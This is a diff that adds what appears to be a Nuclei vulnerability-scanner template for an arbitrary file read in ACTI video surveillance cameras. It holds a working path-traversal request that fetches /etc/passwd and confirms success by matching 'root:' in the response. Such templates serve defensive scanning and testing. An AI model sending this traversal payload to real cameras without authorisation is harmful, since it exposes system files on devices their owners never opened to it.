@@ -1,0 +1,29 @@
+id: acti-camera-file-read
+
+info:
+  name: ACTI Camera Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Arbitrary file read vulnerability in ACTI video surveillance cameras.
+  reference:
+    - http://wiki.peiqi.tech
+
+variables:
+  filepath: "/etc/passwd"
+
+http:
+  - raw:
+      - |
+        GET /images/../../../../../../../..{{filepath}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "root:"
